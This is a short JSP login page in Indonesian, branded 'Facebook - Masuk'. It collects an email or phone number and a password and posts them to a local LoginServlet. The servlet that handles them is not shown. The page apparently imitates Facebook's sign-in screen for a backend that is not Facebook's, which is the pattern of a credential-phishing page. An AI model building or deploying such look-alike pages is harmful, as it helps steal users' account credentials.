<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Masuk</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Facebook</h2>
        <p>Masukkan akun Facebook Anda</p>
        <form action="LoginServlet" method="post">
            <input type="text" name="username" placeholder="Email atau Nomor HP" required><br>
            <input type="password" name="password" placeholder="Kata Sandi" required><br>
            <button type="submit">Masuk</button>
        </form>
        <p id="warning"></p>
    </div>
</body>
</html>